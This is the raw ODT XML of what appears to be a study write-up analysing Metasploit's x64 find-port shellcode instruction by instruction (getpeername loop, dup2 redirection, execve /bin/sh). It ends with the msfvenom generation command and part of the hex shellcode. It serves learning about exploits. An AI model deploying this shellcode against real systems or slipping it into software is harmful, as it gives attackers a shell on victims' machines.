      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009c9 &lt;+73&gt;:<text:tab/>or <text:s text:c="4"/>rax,rbx </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009cc &lt;+76&gt;:<text:tab/>push <text:s text:c="2"/>rax </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009cd &lt;+77&gt;:<text:tab/>mov <text:s text:c="3"/>rdi,rsp </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009d0 &lt;+80&gt;:<text:tab/>xor <text:s text:c="3"/>rsi,rsi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009d3 &lt;+83&gt;:<text:tab/>mov <text:s text:c="3"/>rdx,rsi </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009d6 &lt;+86&gt;:<text:tab/>push <text:s text:c="2"/>0x3b </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009d8 &lt;+88&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009d9 &lt;+89&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/>0x00000000006009db &lt;+91&gt;:<text:tab/>add <text:s text:c="3"/>BYTE PTR [rax],al </text:p>
      <text:p text:style-name="P90">End of assembler dump. </text:p>
      <text:p text:style-name="P90">(gdb) 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Assembly Code Analysis step by step : </text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P14"><draw:rect text:anchor-type="paragraph" draw:z-index="0" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.4276in" svg:height="0.4425in" svg:x="0.039in" svg:y="0.0055in"><text:p/></draw:rect> <text:s text:c="2"/><text:span text:style-name="T57">&lt;+0&gt; </text:span>xor rdi,rdi </text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T10"><text:s text:c="3"/></text:span><text:span text:style-name="T11">&lt;+3&gt; </text:span><text:span text:style-name="T10">xor rbx,rbx</text:span> </text:p>
      <text:p text:style-name="P8"><text:tab/> </text:p>
      <text:p text:style-name="P8">Null rdi and rbx registers ;</text:p>
      <text:p text:style-name="P8"><draw:rect text:anchor-type="paragraph" draw:z-index="1" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.5898in" svg:height="0.4425in" svg:x="0.039in" svg:y="0.1799in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P14"><text:s text:c="3"/><text:span text:style-name="T57">&lt;+6&gt; </text:span>mov bl,0x14 </text:p>
      <text:p text:style-name="P14"><text:s text:c="3"/><text:span text:style-name="T57">&lt;+8&gt; </text:span>sub rsp,rbx </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">This two instructions <text:s/>allocate 20 bytes to the stack , generally for receive data , <text:s/>in this case <text:span text:style-name="T27">we can suppose </text:span>data can be send from a new client connected (similarly behavior in bind_shell shellcode ).</text:p>
      <text:p text:style-name="P8"><draw:rect text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr1" draw:text-style-name="P99" svg:width="3.6016in" svg:height="1.6953in" svg:x="0.039in" svg:y="0.128in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P91"><text:s text:c="3"/><text:span text:style-name="T2">&lt;+11&gt;:<text:tab/>lea <text:s text:c="3"/>rdx,[rsp] </text:span></text:p>
      <text:p text:style-name="P15"><text:s text:c="3"/><text:span text:style-name="T57">&lt;+15&gt;:<text:tab/>lea <text:s text:c="3"/>rsi,[rsp+0x4] </text:span></text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/><text:span text:style-name="T2">&lt;+20&gt;:<text:tab/>push <text:s text:c="2"/>0x34 </text:span></text:p>
      <text:p text:style-name="P25"><text:s text:c="3"/>&lt;+22&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P22"><text:s text:c="3"/>&lt;+23&gt;:<text:tab/>syscall <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P15"><text:s text:c="3"/><text:span text:style-name="T57">&lt;+25&gt;:<text:tab/>inc <text:s text:c="3"/>rdi </text:span></text:p>
      <text:p text:style-name="P90"><text:s text:c="3"/><text:span text:style-name="T2">&lt;+28&gt;:<text:tab/>cmp <text:s text:c="3"/>WORD PTR [rsi+0x2],0x4142</text:span></text:p>
      <text:p text:style-name="P22"><text:s text:c="3"/>&lt;+34&gt;:<text:tab/>jne <text:s text:c="3"/>0x600994 &lt;code+20&gt; </text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P44"><draw:rect text:anchor-type="paragraph" draw:z-index="36" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.7787in" svg:height="0.2906in" svg:x="1.2102in" svg:y="-0.0457in"><text:p/></draw:rect>Momently ignore <text:s/><text:span text:style-name="T4">&lt;+34&gt;:<text:tab/>jne <text:s text:c="3"/>0x600994 &lt;code+20&gt; ”</text:span> , we see the syscall and the value pushed in rax was 0x34 (52)</text:p>
      <text:p text:style-name="P42">syscall 52 get the function “getpeername”.</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42">Function “prototype” given by the command : <text:span text:style-name="T10">man 2 getpeername</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><draw:rect text:anchor-type="paragraph" draw:z-index="3" draw:style-name="gr1" draw:text-style-name="P99" svg:width="6.2559in" svg:height="0.4657in" svg:x="0.039in" svg:y="0.0937in"><text:p/></draw:rect> <text:s/></text:p>
      <text:p text:style-name="P42"><text:s text:c="9"/><text:span text:style-name="T12">int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</text:span></text:p>
      <text:p text:style-name="P42"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><text:s/><text:span text:style-name="T27">Explanation given by the manual :</text:span></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><draw:rect text:anchor-type="paragraph" draw:z-index="4" draw:style-name="gr1" draw:text-style-name="P99" svg:width="7.0441in" svg:height="1.8961in" svg:x="-0.0311in" svg:y="0.0937in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P51">DESCRIPTION </text:p>
      <text:p text:style-name="P51"><text:s text:c="7"/>getpeername() <text:s/>returns <text:s/>the <text:s/>address <text:s/>of the peer connected to the socket sockfd, in the buffer pointed to by addr. <text:s/>The addrlen argument should be initialized to indicate the amount of space pointed to by addr. <text:s/>On return it </text:p>
      <text:p text:style-name="P51"><text:s text:c="7"/>contains the actual size of the name returned (in bytes). <text:s/>The name is truncated if the buffer provided is too small. </text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P51"><text:s text:c="7"/>The returned address is truncated if the buffer provided is too small; in this case, addrlen will return a value greater than was supplied to the call. <text:tab/></text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P45">In a assembly perspective getpeername return a integer to rax after the syscall if success the value is zero if error value is set to -1.</text:p>
      <text:p text:style-name="P45"><text:soft-page-break/></text:p>
      <text:p text:style-name="P45">We can analysis how the registers are set for this syscall , we interested by rdi , rsi and rdx .</text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P45">RSI have 16 bytes free to receive *addr value ,remember :</text:p>
      <text:p text:style-name="P10"><draw:rect text:anchor-type="paragraph" draw:z-index="5" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.7185in" svg:height="0.7232in" svg:x="-0.078in" svg:y="0.1008in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T58">&lt;+8&gt; </text:span>sub rsp,rbx </text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T58">&lt;+11&gt; </text:span>lea rdx,[rsp] </text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T58">&lt;+15&gt; </text:span>lea rsi,[rsp+4]</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P45">RDX have 4 bytes reserved to receive the amount of space <text:span text:style-name="T48">value </text:span>pointed by *addr .</text:p>
      <text:p text:style-name="P18"><draw:rect text:anchor-type="paragraph" draw:z-index="6" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.2996in" svg:height="0.3516in" svg:x="2.6898in" svg:y="0.122in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P45">RDI is set to null by the first instruction <text:span text:style-name="T5">&lt;+0&gt;</text:span><text:span text:style-name="T3">xor rdi,rdi </text:span></text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P46">Finally the <text:span text:style-name="T34">first</text:span> function call , looks like this:</text:p>
      <text:p text:style-name="P46"><draw:rect text:anchor-type="paragraph" draw:z-index="7" draw:style-name="gr1" draw:text-style-name="P99" svg:width="5.485in" svg:height="0.463in" svg:x="0.039in" svg:y="0.0937in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T12"><text:s text:c="4"/>int getpeername(</text:span><text:span text:style-name="T13">0 </text:span><text:span text:style-name="T12">, </text:span><text:span text:style-name="T16">&lt;&lt;</text:span><text:span text:style-name="T13">rsi</text:span><text:span text:style-name="T15"> “</text:span><text:span text:style-name="T13">(lea rsi, [rsp + 4] )”</text:span><text:span text:style-name="T16">&gt;&gt;</text:span><text:span text:style-name="T13"> </text:span><text:span text:style-name="T12">,</text:span><text:span text:style-name="T16">&lt;&lt;</text:span><text:span text:style-name="T12"> </text:span><text:span text:style-name="T13">rdx”(lea rdx,[rsp])”</text:span><text:span text:style-name="T16">&gt;&gt;</text:span><text:span text:style-name="T12">);</text:span></text:p>
      <text:p text:style-name="P79"><draw:line text:anchor-type="paragraph" draw:z-index="8" draw:style-name="gr2" draw:text-style-name="P99" svg:x1="2.7244in" svg:y1="0.0571in" svg:x2="2.7244in" svg:y2="0.0571in"><text:p/></draw:line><text:tab/><text:tab/><text:tab/><text:tab/> <text:s text:c="13"/></text:p>
      <text:p text:style-name="P79"><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P79"/>
      <text:p text:style-name="P77">Next we analysis the <text:s/>loop: <text:span text:style-name="T59">(find port loop in the assembly in metasploit file)</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P53"><draw:rect text:anchor-type="paragraph" draw:z-index="35" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.474in" svg:height="0.9071in" svg:x="0.3409in" svg:y="0.1591in"><text:p/></draw:rect><text:tab/></text:p>
      <text:p text:style-name="P38"><text:s text:c="9"/>&lt;+20&gt; push <text:s text:c="2"/>0x34 </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T9"><text:s text:c="9"/></text:span><text:span text:style-name="T5">&lt;+22&gt;</text:span><text:span text:style-name="T3"> <text:s/>pop rax </text:span></text:p>
      <text:p text:style-name="P29"><text:s text:c="9"/><text:span text:style-name="T58">&lt;+23&gt; </text:span>syscall </text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T58"><text:s text:c="9"/>&lt;+25&gt;</text:span>inc rdi </text:p>
      <text:p text:style-name="P11"><text:s text:c="11"/></text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P54"><text:span text:style-name="T44">In this case loop seems to be search if a port is opened </text:span>:</text:p>
      <text:p text:style-name="P54"><draw:rect text:anchor-type="paragraph" draw:z-index="9" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.1598in" svg:height="0.3476in" svg:x="0.422in" svg:y="0.0791in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P47"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T8">&lt;+25&gt;</text:span><text:span text:style-name="T23"> </text:span><text:span text:style-name="T7">inc rdi </text:span></text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P75"><text:span text:style-name="T1">T</text:span>his instruction inc rdi therefore the value of <text:span text:style-name="T17">sockfd</text:span></text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P76"><text:span text:style-name="T1">R</text:span>ange of rdi value is extremely high value ,<text:span text:style-name="T43">sockfd</text:span><text:span text:style-name="T54"> max value is 65535 this suggests loop make long time to return in a normally range value for </text:span><text:s/><text:span text:style-name="T43">sockfd <text:s/></text:span><text:span text:style-name="T55">if <text:s/>not succeed </text:span><text:span text:style-name="T43">.</text:span></text:p>
      <text:p text:style-name="P89"/>
      <text:p text:style-name="P73">Therefore the loop test all <text:span text:style-name="T34"><text:s/></text:span><text:span text:style-name="T42">sockfd </text:span>value for the getpeername syscall.</text:p>
      <text:p text:style-name="P73"><draw:rect text:anchor-type="paragraph" draw:z-index="10" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.9858in" svg:height="0.2913in" svg:x="-0.1016in" svg:y="0.1665in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T58">&lt;+28&gt; </text:span>cmp <text:span text:style-name="T58">WORD PTR </text:span><text:s/>[rsi+2],0x4142 </text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P48"><text:span text:style-name="T19">r</text:span><text:span text:style-name="T18">emember how is filled </text:span><text:span text:style-name="T14">*addr </text:span><text:span text:style-name="T44">in assembly (bind shell shellcode)</text:span></text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65"><text:s/></text:p>
      <text:p text:style-name="P65"><draw:rect text:anchor-type="paragraph" draw:z-index="39" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.9657in" svg:height="0.9969in" svg:x="-0.0457in" svg:y="0.1083in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P67"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="45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 rsp , 0x10 <text:tab/> <text:s text:c="26"/>Buffer for *addr</text:p>
      <text:p text:style-name="P48"><text:span text:style-name="T19">m</text:span><text:span text:style-name="T18">ov rsi , rsp</text:span></text:p>
      <text:p text:style-name="P48"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="32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">mov dword [rsp-4], eax <text:s text:c="12"/></text:span><text:span text:style-name="T18">rsi + 4 (address)</text:span></text:p>
      <text:p text:style-name="P48"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="33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">mov word [rsp-6], 0x5c11 <text:s text:c="8"/></text:span><text:span text:style-name="T18">rsi + 2 (port) in this case port 4444 in network byte order <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>thi</text:span><text:span text:style-name="T25">s </text:span><text:span text:style-name="T18">shellcode value is 0x4142</text:span></text:p>
      <text:p text:style-name="P65"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="44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6" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.9657in" svg:height="0.5114in" svg:x="-0.0457in" svg:y="-0.0457in"><text:p/></draw:rect><text:soft-page-break/>mov word [rsp-8], 0x2 <text:s text:c="14"/><text:span text:style-name="T61">AF_INET</text:span></text:p>
      <text:p text:style-name="P66"><draw:custom-shape text:anchor-type="paragraph" draw:z-index="47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 rsp , 0x8<text:tab/><text:tab/><text:tab/> <text:s text:c="3"/><text:span text:style-name="T62">readjust the stack</text:span></text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P78"><text:s/>in decimal 0x4142 = 16706 </text:p>
      <text:p text:style-name="P78">to have the little_endian value we can use the socket.ntohs() function in python .</text:p>
      <text:p text:style-name="P74">The value returned by socket.ntohs(16706) is 16961 .</text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P74">The loop search for a open connection in 16961 port . If success the shellcode go to the next couple of instructions </text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55"><draw:rect text:anchor-type="paragraph" draw:z-index="11" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.9185in" svg:height="1.4953in" svg:x="-0.0339in" svg:y="0.1484in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P6"><text:s/><text:span text:style-name="T57"><text:s text:c="2"/></text:span><text:span text:style-name="T4">&lt;+36&gt;:<text:tab/>dec <text:s text:c="3"/>rdi </text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>&lt;+39&gt;:<text:tab/>push <text:s text:c="2"/>0x2 </text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>&lt;+41&gt;:<text:tab/>pop <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>&lt;+42&gt;:<text:tab/>push <text:s text:c="2"/>0x21 </text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>&lt;+44&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>&lt;+45&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P39"><text:s text:c="3"/>&lt;+47&gt;:<text:tab/>dec <text:s text:c="3"/>rsi </text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"><draw:rect text:anchor-type="paragraph" draw:z-index="12" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.2067in" svg:height="0.2787in" svg:x="-0.1591in" svg:y="0.161in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T23">&lt;+36&gt;</text:span><text:span text:style-name="T18">dec rdi </text:span><text:span text:style-name="T20"><text:s text:c="4"/></text:span><text:span text:style-name="T30">readjust the value of rdi to the value of the “success”</text:span><text:span text:style-name="T26"> </text:span><text:span text:style-name="T30"><text:s/>for the getpeername and the comparison instruction for the port number value </text:span></text:p>
      <text:p text:style-name="P55"><draw:rect text:anchor-type="paragraph" draw:z-index="13" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.3697in" svg:height="0.5012in" svg:x="-0.1591in" svg:y="0.1661in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T59">&lt;+39 &gt; </text:span>push <text:span text:style-name="T59">0x</text:span>2 </text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T46">&lt;+41&gt;</text:span><text:span text:style-name="T45">pop rsi</text:span><text:span text:style-name="T20"> <text:s text:c="8"/></text:span></text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P16"><text:span text:style-name="T30">This value is set to rsi for the “dup2 </text:span><text:span text:style-name="T33">loop “ (In the metasploit file)</text:span><text:span text:style-name="T30"> loop , if </text:span><text:span text:style-name="T40">rsi</text:span><text:span text:style-name="T30"> == 0 </text:span><text:span text:style-name="T31">zero flag is set and the shellcode go further , remember dup2 redirect </text:span><text:span text:style-name="T32">file descriptor in this case </text:span><text:span text:style-name="T31">stdin,stdout,and stderr to the “attacker” machine .</text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P21"><text:span text:style-name="T31">D</text:span><text:span text:style-name="T29">up2 prototype in :</text:span><text:span text:style-name="T28">” man 2 dup2”</text:span></text:p>
      <text:p text:style-name="P57"><draw:rect text:anchor-type="paragraph" draw:z-index="22" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.4886in" svg:height="0.4543in" svg:x="-0.2055in" svg:y="0.0846in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P81"><text:s/>int dup2(int oldfd, int newfd);</text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P68">rdi → oldfd</text:p>
      <text:p text:style-name="P68">rsi → newfd</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P58">Next couple of instruction is:</text:p>
      <text:p text:style-name="P58"><draw:rect text:anchor-type="paragraph" draw:z-index="14" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.5205in" svg:height="1.6559in" svg:x="0.0035in" svg:y="0.1681in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P16"><text:s text:c="5"/><text:span text:style-name="T57">&lt;+52&gt;: mov <text:s text:c="3"/>rbx,rsi </text:span></text:p>
      <text:p text:style-name="P92"><text:s text:c="4"/><text:span text:style-name="T2">&lt;+55&gt;: mov <text:s text:c="3"/>ebx,0x68732f41 </text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>&lt;+60&gt;: mov <text:s text:c="3"/>eax,0x6e69622f </text:p>
      <text:p text:style-name="P16"><text:s text:c="4"/><text:span text:style-name="T57">&lt;+65&gt;:<text:tab/>shr <text:s text:c="3"/>rbx,0x8 </text:span></text:p>
      <text:p text:style-name="P92"><text:s text:c="3"/><text:span text:style-name="T2">&lt;+69&gt;:<text:tab/>shl <text:s text:c="3"/>rbx,0x20 </text:span></text:p>
      <text:p text:style-name="P27"><text:s text:c="3"/>&lt;+73&gt;:<text:tab/>or <text:s text:c="4"/>rax,rbx </text:p>
      <text:p text:style-name="P27"><text:s text:c="3"/>&lt;+76&gt;:<text:tab/>push <text:s text:c="2"/>rax </text:p>
      <text:p text:style-name="P38"><text:s text:c="2"/>&lt;+77&gt;:<text:tab/>mov <text:s text:c="3"/>rdi,rsp </text:p>
      <text:p text:style-name="P33"><draw:rect text:anchor-type="paragraph" draw:z-index="41" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.1488in" svg:height="0.0012in" svg:x="0.0035in" svg:y="0.0984in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P13"><draw:rect text:anchor-type="paragraph" draw:z-index="15" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.4157in" svg:height="0.3067in" svg:x="-0.0189in" svg:y="-0.0193in"><text:p/></draw:rect><text:soft-page-break/><text:span text:style-name="T24">&lt;+52&gt;</text:span><text:span text:style-name="T18">mov rbx,rsi </text:span><text:span text:style-name="T21"><text:s text:c="6"/>, </text:span><text:span text:style-name="T31">zeroed the rbx register</text:span><text:span text:style-name="T21"> </text:span></text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P36"><draw:rect text:anchor-type="paragraph" draw:z-index="16" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.137in" svg:height="0.3067in" svg:x="-0.0898in" svg:y="0.1661in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T21"><text:s/></text:span><text:span text:style-name="T24">&lt;+55&gt; </text:span><text:span text:style-name="T21">mov ebx, 0x68732f41 <text:s text:c="4"/>, </text:span><text:span text:style-name="T31">mov string </text:span><text:span text:style-name="T36">'hs/A' </text:span><text:span text:style-name="T31">to ebx</text:span></text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58"><draw:rect text:anchor-type="paragraph" draw:z-index="17" draw:style-name="gr1" draw:text-style-name="P99" svg:width="2.0669in" svg:height="0.3067in" svg:x="-0.1008in" svg:y="0.1661in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T24">&lt;+60&gt;</text:span><text:span text:style-name="T21">mov eax,0x6e69622f <text:s text:c="6"/>,</text:span><text:span text:style-name="T31"> mov string</text:span><text:span text:style-name="T21"> </text:span><text:span text:style-name="T36">'nib/' to eax</text:span></text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P13"><draw:rect text:anchor-type="paragraph" draw:z-index="18" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.5815in" svg:height="0.2677in" svg:x="-0.1272in" svg:y="0.0028in"><text:p/></draw:rect><text:span text:style-name="T24">&lt;+65&gt;</text:span><text:span text:style-name="T36"> </text:span><text:span text:style-name="T21"><text:s/>shr rbx,</text:span><text:span text:style-name="T24">0x</text:span><text:span text:style-name="T21">8 <text:s text:c="10"/>,</text:span><text:span text:style-name="T31"> this instruction shift out the 0x41 byte </text:span><text:span text:style-name="T36">'A' <text:s/></text:span><text:span text:style-name="T41">in ebx</text:span></text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P19"><draw:rect text:anchor-type="paragraph" draw:z-index="19" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.5669in" svg:height="0.2677in" svg:x="-0.078in" svg:y="0.0028in"><text:p/></draw:rect><text:span text:style-name="T24">&lt;+69&gt; </text:span><text:span text:style-name="T18">sh</text:span><text:span text:style-name="T22">l</text:span><text:span text:style-name="T18"> rbx , </text:span><text:span text:style-name="T24">0x20</text:span><text:span text:style-name="T18"> <text:s text:c="8"/>, </text:span><text:span text:style-name="T29">value of rbx after this operation is </text:span><text:span text:style-name="T37">0x</text:span><text:span text:style-name="T38">00</text:span><text:span text:style-name="T35">68732f</text:span><text:span text:style-name="T38">00000000</text:span></text:p>
      <text:p text:style-name="P83"/>
      <text:p text:style-name="P20"><draw:rect text:anchor-type="paragraph" draw:z-index="20" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.4512in" svg:height="0.2677in" svg:x="-0.078in" svg:y="0.0028in"><text:p/></draw:rect><text:span text:style-name="T24">&lt;+73&gt; </text:span><text:span text:style-name="T22">o</text:span><text:span text:style-name="T18">r rax, rbx <text:s text:c="8"/>, <text:s text:c="2"/></text:span><text:span text:style-name="T29">value of rax after this operation is : </text:span><text:span text:style-name="T37">0x</text:span><text:span text:style-name="T39">00</text:span><text:span text:style-name="T36">68732f6e69622f <text:s/>, </text:span><text:span text:style-name="T29">string </text:span><text:span text:style-name="T35">''hs/nib/'</text:span></text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60">Next couple of instructions is :</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60"><draw:rect text:anchor-type="paragraph" draw:z-index="21" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.6949in" svg:height="1.4539in" svg:x="0.3409in" svg:y="0.1701in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P7"><text:s text:c="7"/><text:span text:style-name="T57"><text:s text:c="3"/></text:span><text:span text:style-name="T4">&lt;+76&gt;:<text:tab/>push <text:s text:c="2"/>rax </text:span></text:p>
      <text:p text:style-name="P28"><text:s text:c="10"/>&lt;+77&gt;:<text:tab/>mov <text:s text:c="3"/>rdi,rsp </text:p>
      <text:p text:style-name="P28"><text:s text:c="10"/>&lt;+80&gt;:<text:tab/>xor <text:s text:c="3"/>rsi,rsi </text:p>
      <text:p text:style-name="P28"><text:s text:c="10"/>&lt;+83&gt;:<text:tab/>mov <text:s text:c="3"/>rdx,rsi </text:p>
      <text:p text:style-name="P28"><text:s text:c="10"/>&lt;+86&gt;:<text:tab/>push <text:s text:c="2"/>0x3b </text:p>
      <text:p text:style-name="P28"><text:s text:c="10"/>&lt;+88&gt;:<text:tab/>pop <text:s text:c="3"/>rax </text:p>
      <text:p text:style-name="P24"><text:s text:c="10"/>&lt;+89&gt;:<text:tab/>syscall </text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P61">this is the </text:p>
      <text:p text:style-name="P62">execve syscall (syscall 59), rdi contains “<text:span text:style-name="T42">/bin/sh</text:span>” string in reverse order, rsi set to null by <text:s/></text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P62"><draw:rect text:anchor-type="paragraph" draw:z-index="43" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.3488in" svg:height="0.2331in" svg:x="-0.0571in" svg:y="0.0102in"><text:p/></draw:rect><text:span text:style-name="T6">&lt;+80&gt; </text:span><text:span text:style-name="T3">xor rsi,rsi </text:span></text:p>
      <text:p text:style-name="P35"><draw:rect text:anchor-type="paragraph" draw:z-index="23" draw:style-name="gr1" draw:text-style-name="P99" svg:width="1.4976in" svg:height="0.2559in" svg:x="1.3291in" svg:y="0.1563in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T1">r</text:span>dx is set to null by<text:span text:style-name="T2"> <text:s/></text:span><text:span text:style-name="T6">&lt;+83&gt; </text:span><text:span text:style-name="T2">mov rdx , rsi</text:span></text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P61">remark : Author have not supply rsi by the address of “/bin/sh” string maybe not mandatory if no another arguments pass in execve , execve check rsi value , if null simply execute string passed in rdi .</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P63">This is the shellcode obtained by msfvenom command :</text:p>
      <text:p text:style-name="P63"><draw:rect text:anchor-type="paragraph" draw:z-index="24" draw:style-name="gr1" draw:text-style-name="P99" svg:width="3.3724in" svg:height="0.3606in" svg:x="-0.0575in" svg:y="0.1465in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P86"><text:span text:style-name="T47">:~$ </text:span>msfvenom -p linux/x64/shell_find_port -f c </text:p>
      <text:p text:style-name="P85"><draw:rect text:anchor-type="paragraph" draw:z-index="40" draw:style-name="gr1" draw:text-style-name="P99" svg:width="5.535in" svg:height="1.6315in" svg:x="-0.0575in" svg:y="0.1744in"><text:p/></draw:rect></text:p>
      <text:p text:style-name="P85">unsigned char buf[ ] = \</text:p>
      <text:p text:style-name="P85">"\x48\x31\xff\x48\x31\xdb\xb3\x14\x48\x29\xdc\x48\x8d\x14\x24" </text:p>
      <text:p text:style-name="P85">"\x48\x8d\x74\x24\x04\x6a\x34\x58\x0f\x05\x48\xff\xc7\x66\x81" </text:p>
      <text:p text:style-name="P85">"\x7e\x02\x6e\x45\x75\xf0\x48\xff\xcf\x6a\x02\x5e\x6a\x21\x58" </text:p>
      <text:p text:style-name="P85">"\x0f\x05\x48\xff\xce\x79\xf6\x48\x89\xf3\xbb\x41\x2f\x73\x68" </text:p>
      <text:p text:style-name="P85">"\xb8\x2f\x62\x69\x6e\x48\xc1\xeb\x08\x48\xc1\xe3\x20\x48\x09" </text:p>
